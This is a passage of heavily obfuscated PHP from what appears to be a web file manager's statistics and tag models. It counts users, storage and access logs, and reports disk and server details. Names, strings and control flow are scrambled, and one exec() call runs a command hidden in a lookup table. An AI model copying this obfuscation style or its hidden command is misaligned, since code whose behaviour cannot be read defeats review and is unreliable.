e›ìç¼é…‘; CÓìŠ¾¿­‚: } private function dateList($a«±ò‚˜Èó) { $Eåƒñ°¼°ô =& $_SERVER[İåâé¾]; $eáÈÀØÂÆ = $a«±ò‚˜Èó; $D…¥ğ°·‡Â = strtotime($Eåƒñ°¼°ô[1476]); $b„ğ¦õ† = array(); while ($eáÈÀØÂÆ <= $D…¥ğ°·‡Â) { $b„ğ¦õ†[] = date($Eåƒñ°¼°ô[1475], $eáÈÀØÂÆ); $eáÈÀØÂÆ = strtotime($Eåƒñ°¼°ô[1479], $eáÈÀØÂÆ); } return $b„ğ¦õ†; } public function _recordUser($B³Ìµ‹ïçâ = '') { goto A˜âĞäóÚ‰; BŠ‡¸™Î£: $Aè‚ÖÇĞË‹ = array($d™ÜÁ˜¨[186] => array($d™ÜÁ˜¨[693], $F˜Å¥Ş»ŒĞ)); $bõ‘ä÷‡‘¡ = Model($d™ÜÁ˜¨[1477])->where($Aè‚ÖÇĞË‹)->count($d™ÜÁ˜¨[1086]); $Aè‚ÖÇĞË‹[$d™ÜÁ˜¨[186]] = array($d™ÜÁ˜¨[324], array($Bí”ˆ”Ì¸î, $F˜Å¥Ş»ŒĞ)); goto B¤Şåà»; bø¡Ö‰­¸ä: $CØ°Ñ‚±ß» = array($d™ÜÁ˜¨[216] => $B³Ìµ‹ïçâ, $d™ÜÁ˜¨[457] => (int) $bõ‘ä÷‡‘¡, $d™ÜÁ˜¨[1468] => (int) $Dœ“¼ñ¡‘, $d™ÜÁ˜¨[1469] => (int) $bÛöóé¥Œø); return $this->insert($CØ°Ñ‚±ß»); goto e™ÌâÏàÖ; B¤Şåà»: $Dœ“¼ñ¡‘ = Model($d™ÜÁ˜¨[1477])->where($Aè‚ÖÇĞË‹)->count($d™ÜÁ˜¨[1086]); $Aè‚ÖÇĞË‹[$d™ÜÁ˜¨[29]] = $d™ÜÁ˜¨[1482]; $bÛöóé¥Œø = Model($d™ÜÁ˜¨[1483])->where($Aè‚ÖÇĞË‹)->count($d™ÜÁ˜¨[1484]); goto bø¡Ö‰­¸ä; A˜âĞäóÚ‰: $d™ÜÁ˜¨ =& $_SERVER[İåâé¾]; $Bí”ˆ”Ì¸î = strtotime(date($d™ÜÁ˜¨[1480], strtotime($B³Ìµ‹ïçâ))); $F˜Å¥Ş»ŒĞ = strtotime(date($d™ÜÁ˜¨[1481], strtotime($B³Ìµ‹ïçâ))); goto BŠ‡¸™Î£; e™ÌâÏàÖ: } public function _recordStore($d…•¨ºíÙ = '') { goto Eœ¢„¹¥½; dñÉæŒø×Á: $Eã£Î•î Š = Model($eÎÕõğ»Ÿ®[411])->where($AöÅæ†¢ŒÒ)->sum($eÎÕõğ»Ÿ®[78]); $AöÅæ†¢ŒÒ[$eÎÕõğ»Ÿ®[375]] = 0; $F¦‚­ÁÎÆ¼ = Model($eÎÕõğ»Ÿ®[521])->where($AöÅæ†¢ŒÒ)->sum($eÎÕõğ»Ÿ®[78]); goto C‹œëµ¡¢¡; Eœ¢„¹¥½: $eÎÕõğ»Ÿ® =& $_SERVER[İåâé¾]; $cŠ³ŸÍ­ = strtotime(date($eÎÕõğ»Ÿ®[1481], strtotime($d…•¨ºíÙ))); $AöÅæ†¢ŒÒ = array($eÎÕõğ»Ÿ®[186] => array($eÎÕõğ»Ÿ®[693], $cŠ³ŸÍ­)); goto dñÉæŒø×Á; C‹œëµ¡¢¡: $AöÅæ†¢ŒÒ[$eÎÕõğ»Ÿ®[393]] = 1; $eĞï®í±Ò’ = Model($eÎÕõğ»Ÿ®[521])->where($AöÅæ†¢ŒÒ)->sum($eÎÕõğ»Ÿ®[78]); $AöÅæ†¢ŒÒ[$eÎÕõğ»Ÿ®[393]] = 2; goto D¥˜Àô«„ò; D¥˜Àô«„ò: $B²Ô÷¦Ş…º = Model($eÎÕõğ»Ÿ®[521])->where($AöÅæ†¢ŒÒ)->sum($eÎÕõğ»Ÿ®[78]); $bóÅçµ­ÃÃ = array($eÎÕõğ»Ÿ®[216] => $d…•¨ºíÙ, $eÎÕõğ»Ÿ®[455] => (int) $F¦‚­ÁÎÆ¼, $eÎÕõğ»Ÿ®[1472] => (int) $Eã£Î•î Š, $eÎÕõğ»Ÿ®[1473] => (int) $eĞï®í±Ò’, $eÎÕõğ»Ÿ®[1474] => (int) $B²Ô÷¦Ş…º); return $this->insert($bóÅçµ­ÃÃ); goto EáÊ¶‘¿¢¼; EáÊ¶‘¿¢¼: } public function trend($C¥’°à¤ë, $a÷ÍÙƒĞÀ¶) { goto FÍòÅ¨¯…; FÍòÅ¨¯…: $E•ß‹§šø„ =& $_SERVER[İåâé¾]; if (!$this->init($C¥’°à¤ë)) { return !1; } $Cø¹ÉÒ’ä¨ = $this->trendList($C¥’°à¤ë); goto b…Öµ à¾; cŒ±­÷·‰œ: if (empty($Cø¹ÉÒ’ä¨)) { $f¾ŠìÚ‰´ = date($E•ß‹§šø„[1475], strtotime($E•ß‹§šø„[1476])); $F…ãíÆéëå = array($E•ß‹§šø„[216] => $f¾ŠìÚ‰´); foreach ($fá­†–á[$C¥’°à¤ë] as $bµÌ¬îõË => $EöùåÏÖ±‰) { $F…ãíÆéëå[$bµÌ¬îõË] = 0; } $Cø¹ÉÒ’ä¨[] = $F…ãíÆéëå; } $fŞµ­ÔŒÒí = array(); foreach ($Cø¹ÉÒ’ä¨ as $EöùåÏÖ±‰) { if ($C¥’°à¤ë == $E•ß‹§šø„[1470] && $EöùåÏÖ±‰[$E•ß‹§šø„[1472]] > $EöùåÏÖ±‰[$E•ß‹§šø„[455]]) { $EöùåÏÖ±‰[$E•ß‹§šø„[1472]] = $EöùåÏÖ±‰[$E•ß‹§šø„[455]]; } foreach ($fá­†–á[$C¥’°à¤ë] as $bµÌ¬îõË => $cğ¨ù°¢·) { $EùÍ‘«½º = array($E•ß‹§šø„[216] => $EöùåÏÖ±‰[$E•ß‹§šø„[216]], $E•ß‹§šø„[996] => $cğ¨ù°¢·); $EùÍ‘«½º[$Cã¬¾„Ÿí²[$C¥’°à¤ë]] = isset($EöùåÏÖ±‰[$bµÌ¬îõË]) ? $EöùåÏÖ±‰[$bµÌ¬îõË] : 0; $fŞµ­ÔŒÒí[] = $EùÍ‘«½º; } } goto d¨Šåˆâ¦Õ; d¨Šåˆâ¦Õ: return $fŞµ­ÔŒÒí; goto cê”â¾¶¸; b…Öµ à¾: if ($Cø¹ÉÒ’ä¨ && $a÷ÍÙƒĞÀ¶ != $E•ß‹§šø„[1061]) { $Cš£áŞ²êÕ = $Cø¹ÉÒ’ä¨[0][$E•ß‹§šø„[216]]; $dÂÒß½™­” = $this->validDate($a÷ÍÙƒĞÀ¶, $Cš£áŞ²êÕ); $fÌÓê˜·ì£ = array(); $a‚‡¾™Ñİ = array_to_keyvalue($Cø¹ÉÒ’ä¨, $E•ß‹§šø„[216]); foreach ($dÂÒß½™­” as $f¾ŠìÚ‰´) { if (isset($a‚‡¾™Ñİ[$f¾ŠìÚ‰´])) { $EùÍ‘«½º = $a‚‡¾™Ñİ[$f¾ŠìÚ‰´]; } else { $EùÍ‘«½º = end($Cø¹ÉÒ’ä¨); $EùÍ‘«½º[$E•ß‹§šø„[216]] = $f¾ŠìÚ‰´; if ($C¥’°à¤ë == $E•ß‹§šø„[416]) { $EùÍ‘«½º[$E•ß‹§šø„[1468]] = $EùÍ‘«½º[$E•ß‹§šø„[1469]] = 0; } } $fÌÓê˜·ì£[] = $EùÍ‘«½º; } $Cø¹ÉÒ’ä¨ = $fÌÓê˜·ì£; } $fá­†–á = array($E•ß‹§šø„[416] => array($E•ß‹§šø„[457] => LNG($E•ß‹§šø„[1485]), $E•ß‹§šø„[1468] => LNG($E•ß‹§šø„[1486]), $E•ß‹§šø„[1469] => LNG($E•ß‹§šø„[1487])), $E•ß‹§šø„[1470] => array($E•ß‹§šø„[455] => LNG($E•ß‹§šø„[1488]), $E•ß‹§šø„[1472] => LNG($E•ß‹§šø„[1489]), $E•ß‹§šø„[1473] => LNG($E•ß‹§šø„[1490]), $E•ß‹§šø„[1474] => LNG($E•ß‹§šø„[1491]))); $Cã¬¾„Ÿí² = array($E•ß‹§šø„[416] => $E•ß‹§šø„[1492], $E•ß‹§šø„[1470] => $E•ß‹§šø„[78]); goto cŒ±­÷·‰œ; cê”â¾¶¸: } public function validDate($eËçƒ˜Û…©, $a²±ƒÈ¬ù) { goto d¿È§ïˆ; eº–¸ô–á: return $DÚ¹¸„¨´¿; goto bØ´¡æšÅ; d¿È§ïˆ: $fÂƒ‡åÂç˜ =& $_SERVER[İåâé¾]; $F³¨µ“£ª¼ = date($fÂƒ‡åÂç˜[1475], strtotime($fÂƒ‡åÂç˜[1476])); $DÚ¹¸„¨´¿ = array($F³¨µ“£ª¼); goto CÍ¢–Ñö ‡; CÍ¢–Ñö ‡: switch ($eËçƒ˜Û…©) { case $fÂƒ‡åÂç˜[1068]: $d±¬ÛÑæŞÎ = mktime(0, 0, 0, date($fÂƒ‡åÂç˜[1493]), date($fÂƒ‡åÂç˜[1494]) - date($fÂƒ‡åÂç˜[959]) + 7 - 7, date($fÂƒ‡åÂç˜[1495])); $eì ¡ä„õ = 0; do { $Dñİ×ŸËæ = date($fÂƒ‡åÂç˜[1475], $d±¬ÛÑæŞÎ - 3600 * 24 * 7 * $eì ¡ä„õ); $DÚ¹¸„¨´¿[] = $Dñİ×ŸËæ; $eì ¡ä„õ++; } while ($a²±ƒÈ¬ù < $Dñİ×ŸËæ); break; case $fÂƒ‡åÂç˜[1066]: $eì ¡ä„õ = 1; do { $eÖÈøóãø = date($fÂƒ‡åÂç˜[1496], strtotime("\55\40{$eì ¡ä„õ}\40\x6d\x6f\156\x74\x68\x73")); $DÚ¹¸„¨´¿[] = $eÖÈøóãø; $eì ¡ä„õ++; } while ($a²±ƒÈ¬ù < $eÖÈøóãø); break; case $fÂƒ‡åÂç˜[1428]: $c”ÑÍ–¢ç = (int) date($fÂƒ‡åÂç˜[1495], strtotime($a²±ƒÈ¬ù)); $FªƒŠ«×¦ = (int) date($fÂƒ‡åÂç˜[1495]); if ($c”ÑÍ–¢ç >= $FªƒŠ«×¦) { break; } for ($c”ÑÍ–¢ç; $c”ÑÍ–¢ç < $FªƒŠ«×¦; $c”ÑÍ–¢ç++) { $DÚ¹¸„¨´¿[] = $c”ÑÍ–¢ç . $fÂƒ‡åÂç˜[1497]; } break; default: break; } if ($a²±ƒÈ¬ù > end($DÚ¹¸„¨´¿)) { array_pop($DÚ¹¸„¨´¿); } sort($DÚ¹¸„¨´¿); goto eº–¸ô–á; bØ´¡æšÅ: } public function listTable($eàÚµœ»…ƒ) { $EËĞ¨¿ø’¶ = ucfirst($eàÚµœ»…ƒ); return Model($EËĞ¨¿ø’¶)->listData(); } public function option($a¢Ûª¼ä¬ß) { $A‰“‰Ï·¦è = $_SERVER[İåâé¾][1498] . ucfirst($a¢Ûª¼ä¬ß); return $this->{$A‰“‰Ï·¦è}(); } private function optionUser() { goto d›ôŞŠ¤‡; BœÜÎˆÖ: $AŞ« ùë¹À = Model($c¢Á‡æ¿¥Õ[1477])->where($FÒ„ŞÏ¿×)->count($c¢Á‡æ¿¥Õ[1086]); return array($c¢Á‡æ¿¥Õ[452] => (int) $AêÏöÓ´ß, $c¢Á‡æ¿¥Õ[1502] => (int) ($AêÏöÓ´ß - $bÏÃŞ¡²ê), $c¢Á‡æ¿¥Õ[1503] => (int) $bÏÃŞ¡²ê, $c¢Á‡æ¿¥Õ[1504] => (int) $AŞ« ùë¹À, $c¢Á‡æ¿¥Õ[1505] => $dˆìãä®ğŒ); goto eµ¼áù¯í; CÇ’Ø’–¨±: $B²Š·¨è† = strtotime($c¢Á‡æ¿¥Õ[1500]); $FÒ„ŞÏ¿× = array($c¢Á‡æ¿¥Õ[1501] => array($c¢Á‡æ¿¥Õ[694], $B²Š·¨è†)); $dˆìãä®ğŒ = (int) Model($c¢Á‡æ¿¥Õ[1477])->where($FÒ„ŞÏ¿×)->count($c¢Á‡æ¿¥Õ[1086]); goto c°¶ğ‡’å; c°¶ğ‡’å: if (!$dˆìãä®ğŒ) { $dˆìãä®ğŒ = 1; } $B²Š·¨è† = strtotime(date($c¢Á‡æ¿¥Õ[1480])); $FÒ„ŞÏ¿× = array($c¢Á‡æ¿¥Õ[1501] => array($c¢Á‡æ¿¥Õ[694], $B²Š·¨è†)); goto BœÜÎˆÖ; d›ôŞŠ¤‡: $c¢Á‡æ¿¥Õ =& $_SERVER[İåâé¾]; $AêÏöÓ´ß = Model($c¢Á‡æ¿¥Õ[1477])->count($c¢Á‡æ¿¥Õ[1086]); $bÏÃŞ¡²ê = Model($c¢Á‡æ¿¥Õ[1477])->where($c¢Á‡æ¿¥Õ[1499])->count($c¢Á‡æ¿¥Õ[1086]); goto CÇ’Ø’–¨±; eµ¼áù¯í: } private function optionFile() { goto F’ŠŒèÖˆ ; cˆªÕ©ƒÒµ: $eÖˆéøªö‰ = Model($c“±•ßî“[521])->where($bÙêµÛèµ‹)->sum($c“±•ßî“[78]); $CŠõ¶íó¦Œ = Model($c“±•ßî“[521])->where($bÙêµÛèµ‹)->count($c“±•ßî“[374]); return array($c“±•ßî“[455] => $B¡¶‹¸âÑá, $c“±•ßî“[1472] => $C¦”µâŠ„¼, $c“±•ßî“[1506] => $B¡¶‹¸âÑá - $C¦”µâŠ„¼, $c“±•ßî“[1507] => (int) $eÖˆéøªö‰, $c“±•ßî“[457] => (int) $Aµ…ÚÆ»¨¦, $c“±•ßî“[1508] => (int) $CŠõ¶íó¦Œ); goto d„Ä¶¼š±Ù; dÎ ‚™Ú: $C¦”µâŠ„¼ = $EÕ¾õ«”ÆÇ[$c“±•ßî“[1472]]; $Aµ…ÚÆ»¨¦ = Model($c“±•ßî“[521])->where(array($c“±•ßî“[375] => 0))->count($c“±•ßî“[374]); $bÙêµÛèµ‹ = array($c“±•ßî“[375] => 0, $c“±•ßî“[186] => array($c“±•ßî“[694], strtotime(date($c“±•ßî“[1480])))); goto cˆªÕ©ƒÒµ; F’ŠŒèÖˆ : $c“±•ßî“ =& $_SERVER[İåâé¾]; $EÕ¾õ«”ÆÇ = $this->sourceSize(); $B¡¶‹¸âÑá = $EÕ¾õ«”ÆÇ[$c“±•ßî“[78]]; goto dÎ ‚™Ú; d„Ä¶¼š±Ù: } private function optionAccess() { $AááÖ¹ŠÄ =& $_SERVER[İåâé¾]; return array($AááÖ¹ŠÄ[452] => $this->typeLogCnt(), $AááÖ¹ŠÄ[101] => $this->typeLogCnt($AááÖ¹ŠÄ[101]), $AááÖ¹ŠÄ[1509] => $this->typeLogCnt($AááÖ¹ŠÄ[1509]), $AááÖ¹ŠÄ[1510] => $this->typeLogCnt($AááÖ¹ŠÄ[1510]), $AááÖ¹ŠÄ[1511] => $this->typeLogCnt($AááÖ¹ŠÄ[1511]), $AááÖ¹ŠÄ[416] => $this->typeLogCnt($AááÖ¹ŠÄ[33], $AááÖ¹ŠÄ[1484])); } private function typeLogCnt($Fº÷ÛÈ˜í÷ = '', $cÑ­÷Ï“Ì’ = "\x69\x64") { goto FóÃœ™õ§; Aª‰Üõ¾Œƒ: $BæÅÌƒ‘èÄ = array($F¼ÛŠ¢™ ó[186] => array($F¼ÛŠ¢™ ó[694], $Dñ­¦ÖöÇ½)); if ($Fº÷ÛÈ˜í÷) { $BæÅÌƒ‘èÄ[$F¼ÛŠ¢™ ó[29]] = array($F¼ÛŠ¢™ ó[7], $b½´»¯ÇÒ·[$Fº÷ÛÈ˜í÷]); } $fÏøÁ…„§Á = Model($F¼ÛŠ¢™ ó[1483])->where($BæÅÌƒ‘èÄ)->count($cÑ­÷Ï“Ì’); goto d±‹Ú±’¹; FóÃœ™õ§: $F¼ÛŠ¢™ ó =& $_SERVER[İåâé¾]; $b½´»¯ÇÒ· = array($F¼ÛŠ¢™ ó[101] => array($F¼ÛŠ¢™ ó[1512], $F¼ÛŠ¢™ ó[1513]), $F¼ÛŠ¢™ ó[1509] => array($F¼ÛŠ¢™ ó[1514]), $F¼ÛŠ¢™ ó[1510] => array($F¼ÛŠ¢™ ó[1515], $F¼ÛŠ¢™ ó[1516]), $F¼ÛŠ¢™ ó[1511] => array($F¼ÛŠ¢™ ó[1517], $F¼ÛŠ¢™ ó[1518]), $F¼ÛŠ¢™ ó[1519] => array($F¼ÛŠ¢™ ó[1520], $F¼ÛŠ¢™ ó[1521], $F¼ÛŠ¢™ ó[1522])); $Dñ­¦ÖöÇ½ = strtotime(date($F¼ÛŠ¢™ ó[1480])); goto Aª‰Üõ¾Œƒ; d±‹Ú±’¹: return (int) $fÏøÁ…„§Á; goto eó²¢¤¡å; eó²¢¤¡å: } private function optionServer() { goto EŞ¹êçµ¾; f¯„¬‹»ì: if ($D‚øìÌï“° == $eµ“¶¥¿“[491]) { $Cô¤Úùˆ¥· = explode($eµ“¶¥¿“[492], $eÜ‹Ä­ğ˜[$eµ“¶¥¿“[493]]); $D‚øìÌï“° = $Cô¤Úùˆ¥·[0]; } if ($D‚øìÌï“° == $eµ“¶¥¿“[590] || $D‚øìÌï“° == $eµ“¶¥¿“[473]) { $c¼ëÀ±àĞÃ = Model()->db()->query($eµ“¶¥¿“[1523]); $C§Š³ë…Ğ™ = $c¼ëÀ±àĞÃ[0] && isset($c¼ëÀ±àĞÃ[0][$eµ“¶¥¿“[995]]) ? $c¼ëÀ±àĞÃ[0][$eµ“¶¥¿“[995]] : 0; $D‚øìÌï“° = $eµ“¶¥¿“[1524] . ($C§Š³ë…Ğ™ ? $eµ“¶¥¿“[8] . $C§Š³ë…Ğ™ : $eµ“¶¥¿“[33]); } $A¯òÊõÒ¼® = $GLOBALS[$eµ“¶¥¿“[6]][$eµ“¶¥¿“[340]][$eµ“¶¥¿“[522]]; goto dğÂÌ§ÔÇí; dË…’òíˆ–: $C¶©ŒÀ’¸ = $Fœç¢ì»„”[0]; $eÜ‹Ä­ğ˜ = $GLOBALS[$eµ“¶¥¿“[6]][$eµ“¶¥¿“[17]]; $D‚øìÌï“° = $eÜ‹Ä­ğ˜[$eµ“¶¥¿“[490]]; goto f¯„¬‹»ì; E«˜ñç ˜: $EÌø„¯çÓ = array($eµ“¶¥¿“[480] => $B§ÛÃ˜à®Á[$eµ“¶¥¿“[368]]); $dÆªäù­—À = Model($eµ“¶¥¿“[411])->where($EÌø„¯çÓ)->sum($eµ“¶¥¿“[78]); $Fœç¢ì»„” = explode($eµ“¶¥¿“[50], $_SERVER[$eµ“¶¥¿“[135]]); goto dË…’òíˆ–; EŞ¹êçµ¾: $eµ“¶¥¿“ =& $_SERVER[İåâé¾]; $A†›¡„ˆ = $this->diskDriver(); $B§ÛÃ˜à®Á = KodIO::defaultDriver(); goto E«˜ñç ˜; dğÂÌ§ÔÇí: return array($eµ“¶¥¿“[1525] => $A†›¡„ˆ ? $A†›¡„ˆ[$eµ“¶¥¿“[1526]] : 0, $eµ“¶¥¿“[1527] => $A†›¡„ˆ ? $A†›¡„ˆ[$eµ“¶¥¿“[1528]] : 0, $eµ“¶¥¿“[1529] => (int) $B§ÛÃ˜à®Á[$eµ“¶¥¿“[1526]] * 1024 * 1024 * 1024, $eµ“¶¥¿“[1530] => (int) $dÆªäù­—À, $eµ“¶¥¿“[1531] => ucfirst($C¶©ŒÀ’¸), $eµ“¶¥¿“[1532] => $eµ“¶¥¿“[1533] . PHP_VERSION, $eµ“¶¥¿“[1534] => phpBuild64() ? 64 : 32, $eµ“¶¥¿“[451] => str_replace($eµ“¶¥¿“[1535], $eµ“¶¥¿“[670], $D‚øìÌï“°), $eµ“¶¥¿“[340] => ucfirst($A¯òÊõÒ¼®), $eµ“¶¥¿“[28] => $_SERVER[$eµ“¶¥¿“[1536]]); goto dĞ¯ÙÃ÷‚Ç; dĞ¯ÙÃ÷‚Ç: } private function diskDriver() { goto f¥•ÚÕŠé ; f¥•ÚÕŠé : $C±ò”‹Õà =& $_SERVER[İåâé¾]; $Ağ¾†”•½ = $C±ò”‹Õà[8]; $BºƒÂ¼±èò = $GLOBALS[$C±ò”‹Õà[6]][$C±ò”‹Õà[1537]] == $C±ò”‹Õà[1538]; goto DÏË¦ÇÇÅò; EÃ¼ã­ØÎ‰: $B†ë¨„ÏÇ¯ = $c¿£Ú˜àÁ - @disk_free_space($Ağ¾†”•½); return array($C±ò”‹Õà[1526] => $c¿£Ú˜àÁ, $C±ò”‹Õà[1528] => $B†ë¨„ÏÇ¯); goto Aµ„š²Ææ; DÏË¦ÇÇÅò: if ($BºƒÂ¼±èò) { $Ağ¾†”•½ = $C±ò”‹Õà[1539]; if (function_exists($C±ò”‹Õà[1540])) { exec($C±ò”‹Õà[1541], $bœ™øğ©Œ); $Ağ¾†”•½ = $bœ™øğ©Œ[1] . $C±ò”‹Õà[8]; } } if (!file_exists($Ağ¾†”•½)) { return; } $c¿£Ú˜àÁ = @disk_total_space($Ağ¾†”•½); goto EÃ¼ã­ØÎ‰; Aµ„š²Ææ: } public function fileChart($E¶ÓñÇ»Ö®) { goto DïÔ¤¬ã¸; E±òÙ °äğ: $eã²Ú÷šÏ[$d½²„–›‚æ[393]] = 2; $Bğ†‚È‰®Ã = Model($d½²„–›‚æ[521])->where($eã²Ú÷šÏ)->sum($d½²„–›‚æ[78]); return array($d½²„–›‚æ[455] => $aßÈêá­¤Ø[$d½²„–›‚æ[78]], $d½²„–›‚æ[1472] => $aßÈêá­¤Ø[$d½²„–›‚æ[1472]], $d½²„–›‚æ[1473] => (int) $AÒƒ¸­Ê…Œ, $d½²„–›‚æ[1474] => (int) $Bğ†‚È‰®Ã); goto aËİ£‚ÛŒò; DïÔ¤¬ã¸: $d½²„–›‚æ =& $_SERVER[İåâé¾]; if (isset($E¶ÓñÇ»Ö®[$d½²„–›‚æ[1086]])) { return Model($d½²„–›‚æ[521])->userFileTypeProfile($E¶ÓñÇ»Ö®[$d½²„–›‚æ[1086]]); } if (isset($E¶ÓñÇ»Ö®[$d½²„–›‚æ[1542]])) { return Model($d½²„–›‚æ[521])->groupFileTypeProfile($E¶ÓñÇ»Ö®[$d½²„–›‚æ[1542]]); } goto bçİ³¾ÀçÂ; bçİ³¾ÀçÂ: $aßÈêá­¤Ø = $this->sourceSize(); $eã²Ú÷šÏ = array($d½²„–›‚æ[384] => 0, $d½²„–›‚æ[393] => 1); $AÒƒ¸­Ê…Œ = Model($d½²„–›‚æ[521])->where($eã²Ú÷šÏ)->sum($d½²„–›‚æ[78]); goto E±òÙ °äğ; aËİ£‚ÛŒò: } private function sourceSize() { $b®á„î„ªÇ =& $_SERVER[İåâé¾]; $a‡Œ‹øğ = Model($b®á„î„ªÇ[521])->where(array($b®á„î„ªÇ[375] => 0))->sum($b®á„î„ªÇ[78]); $D½¸­¹»İß = Model($b®á„î„ªÇ[411])->sum($b®á„î„ªÇ[78]); if ($D½¸­¹»İß > $a‡Œ‹øğ) { $D½¸­¹»İß = $a‡Œ‹øğ; } return array($b®á„î„ªÇ[78] => (int) $a‡Œ‹øğ, $b®á„î„ªÇ[1472] => (int) $D½¸­¹»İß); } } goto Aâ„ª”íÙ¶; eÆàò™ˆ³: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($dèë¦“ç) { $bØÎºĞØµ´ =& $_SERVER[İåâé¾]; return array($bØÎºĞØµ´[1905] => array(USER_ID, $bØÎºĞØµ´[1969])); } protected function listData() { $Ağèö¢”¸  =& $_SERVER[İåâé¾]; $EŸÊéÏ•‘İ = array($Ağèö¢”¸ [1077] => USER_ID, $Ağèö¢”¸ [1907] => array($Ağèö¢”¸ [1970], 0)); $Bõ¬æ¿íƒ› = $Ağèö¢”¸ [1971]; $f÷ÓÔ‚ä×ø = $Ağèö¢”¸ [1972]; $D”ïî…¥ÔÂ = $this->field($Bõ¬æ¿íƒ›)->where($EŸÊéÏ•‘İ)->order($f÷ÓÔ‚ä×ø)->select(); return $D”ïî…¥ÔÂ ? $D”ïî…¥ÔÂ : array(); } protected function listByTag($eÔ°š¾’ù) { } protected function addToTag($aÍÒº§áòÓ, $BäÉ¼Ç–…ƒ) { $Eùµ´šíî† =& $_SERVER[İåâé¾]; if (!Model($Eùµ´šíî†[1742])->listData($BäÉ¼Ç–…ƒ) || !Model($Eùµ´šíî†[521])->pathInfo($aÍÒº§áòÓ)) { return !1; } $d”—’½ÜÄ = array($Eùµ´šíî†[1077] => USER_ID, $Eùµ´šíî†[1907] => $BäÉ¼Ç–…ƒ, $Eùµ´šíî†[1604] => $aÍÒº§áòÓ, $Eùµ´šíî†[810] => $Eùµ´šíî†[978], $Eùµ´šíî†[387] => $Eùµ´šíî†[33], $Eùµ´šíî†[1546] => 0); if ($this->where($d”—’½ÜÄ)->find()) { return !1; } return $this->add($d”—’½ÜÄ); } protected function removeFromTag($aÌÊÕß’Ã‹, $DˆâÚ‘¯Œ) { $bëÃŒ³˜¤² =& $_SERVER[İåâé¾]; if (!Model($bëÃŒ³˜¤²[1742])->listData($DˆâÚ‘¯Œ) || !Model($bëÃŒ³˜¤²[521])->pathInfo($aÌÊÕß’Ã‹)) { return !1; } $FšŠÕÎôò‡ = array($bëÃŒ³˜¤²[1077] => USER_ID, $bëÃŒ³˜¤²[1907] => $DˆâÚ‘¯Œ, $bëÃŒ³˜¤²[810] => $bëÃŒ³˜¤²[978], $bëÃŒ³˜¤²[1604] => $aÌÊÕß’Ã‹); return $this->where($FšŠÕÎôò‡)->delete(); } protected function removeByTag($cÎ²¯è×¼Ÿ) { $F§‹‚•Ñ¾× =& $_SERVER[İåâé¾]; if (!$cÎ²¯è×¼Ÿ) { return !1; } $C™”î½‡¦ = array($F§‹‚•Ñ¾×[1077] => USER_ID, $F§‹‚•Ñ¾×[1907] => $cÎ²¯è×¼Ÿ); return $this->where($C™”î½‡¦)->delete(); } protected function removeBySource($D™Íô°õõ¢) { $D¶¼ŠÔØ†Ÿ =& $_SERVER[İåâé¾]; $dè¸¹©ç‹‹ = array($D¶¼ŠÔØ†Ÿ[1077] => USER_ID, $D¶¼ŠÔØ†Ÿ[1604] => $D™Íô°õõ¢, $D¶¼ŠÔØ†Ÿ[1907] => array($D¶¼ŠÔØ†Ÿ[694], 0)); return $this->where($dè¸¹©ç‹‹)->delete(); } }